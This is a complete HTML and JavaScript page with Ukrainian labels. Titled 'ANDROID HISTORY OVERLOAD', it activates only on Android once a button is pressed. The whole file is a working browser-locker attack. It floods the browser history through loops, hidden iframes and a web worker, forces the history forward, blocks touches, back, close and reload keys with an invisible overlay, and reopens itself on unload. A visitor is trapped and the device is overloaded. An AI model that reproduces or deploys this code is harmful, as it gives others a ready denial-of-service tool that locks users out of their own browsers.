<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>⚠️ ANDROID HISTORY OVERLOAD</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-tap-highlight-color:transparent; }
    html, body { width:100%; height:100%; background:#000; overflow:hidden; touch-action:none; }
    body { display:flex; align-items:center; justify-content:center; font-family:monospace; font-size:16px; }
    #activate-btn {
      background:transparent; border:2px solid #fff; color:#fff; padding:1rem 2rem;
      font-size:1.5rem; font-family:monospace; cursor:pointer; transition:0.2s;
      box-shadow:0 0 10px #fff; letter-spacing:2px; z-index:10000;
    }
    #activate-btn:hover { background:#fff; color:#000; }
    #activate-btn:active { transform:scale(0.95); }
    #blocker-overlay {
      position:fixed; top:0; left:0; width:100%; height:100%; background:transparent;
      z-index:999999; display:none; touch-action:none;
    }
  </style>
</head>
<body>
  <button id="activate-btn">[ АКТИВУВАТИ НЕСКІНЧЕННИЙ СПАМ ]</button>
  <div id="blocker-overlay"></div>

  <script>
    (function() {
      'use strict';

      // ---- ПЕРЕВІРКА НА ANDROID ----
      const isAndroid = /Android/i.test(navigator.userAgent);
      if (!isAndroid) {
        document.body.innerHTML = '<div style="color:#fff; text-align:center;">Цей захист працює тільки на Android.</div>';
        return;
      }

      // ---- ГЛОБАЛЬНІ ЗМІННІ ----
      let trapActive = false;
      const BASE = location.href.split('#')[0];
      let overlay = document.getElementById('blocker-overlay');
      let spamInterval = null;
      let popHandler = null;

      // ---- ФУНКЦІЯ МАСОВОГО ДОДАВАННЯ (10 000 ЗА ВИКЛИК) ----
      function pushTenThousand(prefix = 'spam') {
        if (!trapActive) return;
        const t = Date.now();
        // Додаємо 10 000 записів за раз (можна розбити на частини, щоб не блокувати потік)
        for (let i = 0; i < 10000; i++) {
          try {
            history.pushState(
              { i, t, p: prefix },
              '',
              BASE + '#' + prefix + (t + i).toString(36) + Math.random().toString(36).substring(2, 10)
            );
          } catch (e) {
            // Якщо ліміт досягнуто – ігноруємо (малоймовірно)
            break;
          }
        }
      }

      // ---- НЕСКІНЧЕННИЙ ЦИКЛ СПАМУ (ЧЕРЕЗ SETTIMEOUT 0) ----
      function infiniteSpam() {
        if (!trapActive) return;
        pushTenThousand('inf');
        // Викликаємо себе знову як тільки можливо
        setTimeout(infiniteSpam, 0);
      }

      // ---- ДОДАТКОВИЙ ІНТЕРВАЛЬНИЙ СПАМ (КОЖНІ 10 МС) ----
      function startIntervalSpam() {
        setInterval(() => {
          if (trapActive) pushTenThousand('int');
        }, 10);
      }

      // ---- ОБРОБНИК POPSTATE (МИТТЄВИЙ СПАМ) ----
      function onPopState(e) {
        if (!trapActive) return;
        // Негайно додаємо 10 000 записів
        pushTenThousand('pop');
        // Також перемотуємо вперед, щоб знищити позицію назад
        try { history.go(500); } catch(e) {}
      }

      // ---- БЛОКУВАННЯ ФІЗИЧНИХ КЛАВІШ ----
      function blockKeys(e) {
        if (!trapActive) return;
        const key = e.key;
        if (
          key === 'Escape' ||
          (e.ctrlKey && (key === 'w' || key === 'W' || key === 'q' || key === 'Q' || key === 'r' || key === 'R')) ||
          key === 'F5' ||
          (e.ctrlKey && e.shiftKey && (key === 'I' || key === 'J' || key === 'C')) ||
          key === 'BrowserBack' ||
          e.keyCode === 166 ||
          (key === 'Backspace' && document.activeElement === document.body)
        ) {
          e.preventDefault();
          e.stopImmediatePropagation();
          pushTenThousand('key');
        }
      }
      document.addEventListener('keydown', blockKeys, { capture: true });

      // ---- БЛОКУВАННЯ ВСІХ ДОТИКІВ ЧЕРЕЗ ОВЕРЛЕЙ ----
      function activateOverlay() {
        overlay.style.display = 'block';
        overlay.addEventListener('touchstart', (e) => {
          e.preventDefault();
          e.stopPropagation();
          pushTenThousand('ov_ts');
        }, { passive: false, capture: true });

        overlay.addEventListener('touchmove', (e) => {
          e.preventDefault();
          e.stopPropagation();
        }, { passive: false, capture: true });

        overlay.addEventListener('touchend', (e) => {
          e.preventDefault();
          e.stopPropagation();
          pushTenThousand('ov_te');
        }, { passive: false, capture: true });

        overlay.addEventListener('touchcancel', (e) => {
          e.preventDefault();
          e.stopPropagation();
        }, { passive: false, capture: true });

        // Миша (для completeness)
        overlay.addEventListener('mousedown', (e) => e.preventDefault(), { passive: false });
        overlay.addEventListener('mousemove', (e) => e.preventDefault(), { passive: false });
        overlay.addEventListener('mouseup', (e) => e.preventDefault(), { passive: false });
      }

      // ---- IFRAME-ПАСТКИ (ДОДАТКОВИЙ СПАМ) ----
      function createIframeTraps() {
        if (!trapActive) return;
        for (let k = 0; k < 3; k++) {
          try {
            const ifr = document.createElement('iframe');
            ifr.style.cssText = 'position:fixed;width:1px;height:1px;top:-10px;left:-10px;opacity:0;pointer-events:none;border:none;';
            ifr.srcdoc = `<!DOCTYPE html><html><body><script>
              (function(){
                var b = location.href.split('#')[0];
                // Нескінченний спам у фреймі
                function spam() {
                  for(var i=0;i<5000;i++) history.pushState({},'',b+'#if_'+Math.random());
                  setTimeout(spam, 5);
                }
                spam();
                window.addEventListener('popstate', function() {
                  for(var i=0;i<5000;i++) history.pushState({},'',b+'#ifpop_'+Math.random());
                });
              })();
            <\/script></body></html>`;
            document.body.appendChild(ifr);
          } catch(e) {}
        }
      }

      // ---- WEB WORKER (НЕ МОЖЕ ПРАЦЮВАТИ З HISTORY, АЛЕ МОЖЕ БУДИТИ ОСНОВНИЙ ПОТІК) ----
      function startWorker() {
        if (!trapActive) return;
        const blob = new Blob([`
          let count = 0;
          function spam() {
            postMessage(count++);
            setTimeout(spam, 1);
          }
          spam();
        `], { type: 'application/javascript' });
        const worker = new Worker(URL.createObjectURL(blob));
        worker.onmessage = () => {
          if (trapActive) pushTenThousand('wk');
        };
      }

      // ---- ПОДІЇ ПОВЕРНЕННЯ ----
      document.addEventListener('visibilitychange', () => {
        if (!trapActive || document.hidden) return;
        pushTenThousand('vis');
      });

      window.addEventListener('focus', () => {
        if (trapActive) pushTenThousand('focus');
      });

      window.addEventListener('pageshow', () => {
        if (trapActive) pushTenThousand('ps');
      });

      window.addEventListener('hashchange', () => {
        if (trapActive) pushTenThousand('hc');
      }, true);

      window.addEventListener('resize', () => {
        if (trapActive) pushTenThousand('resize');
      });

      // ---- ПЕРЕД ВИХОДОМ ----
      window.addEventListener('beforeunload', e => {
        if (!trapActive) return;
        e.preventDefault();
        e.returnValue = '';
        try { window.open(window.location.href, '_blank'); } catch(e) {}
        return '';
      });

      // ---- БЛОКУВАННЯ КОНТЕКСТНОГО МЕНЮ ----
      document.addEventListener('contextmenu', e => e.preventDefault(), { capture: true });

      // ---- ПОСТІЙНЕ ПЕРЕМОТУВАННЯ ВПЕРЕД ----
      function startGoLoop() {
        setInterval(() => {
          if (trapActive) try { history.go(1000); } catch(e) {}
        }, 20);
      }

      // ---- АКТИВАЦІЯ ПАСТКИ ----
      function activateTrap() {
        if (trapActive) return;
        trapActive = true;

        // Зникає кнопка
        const btn = document.getElementById('activate-btn');
        if (btn) btn.remove();

        // Запускаємо всі механізми
        window.addEventListener('popstate', onPopState, true);
        infiniteSpam();                 // безперервний спам через setTimeout 0
        startIntervalSpam();             // спам кожні 10 мс
        startGoLoop();                   // постійне history.go
        createIframeTraps();              // iframe-пастки
        startWorker();                    // web worker
        activateOverlay();                 // оверлей

        // Початковий мега-спам (50 000)
        pushTenThousand('init1');
        pushTenThousand('init2');
        pushTenThousand('init3');
        pushTenThousand('init4');
        pushTenThousand('init5');
      }

      // ---- ПРИВ'ЯЗКА КНОПКИ ----
      document.getElementById('activate-btn').addEventListener('click', activateTrap);

      // Захист кнопки до активації
      document.addEventListener('touchstart', (e) => {
        if (e.target.id === 'activate-btn') e.stopPropagation();
      }, { capture: true, passive: true });

    })();
  </script>
</body>
</html>
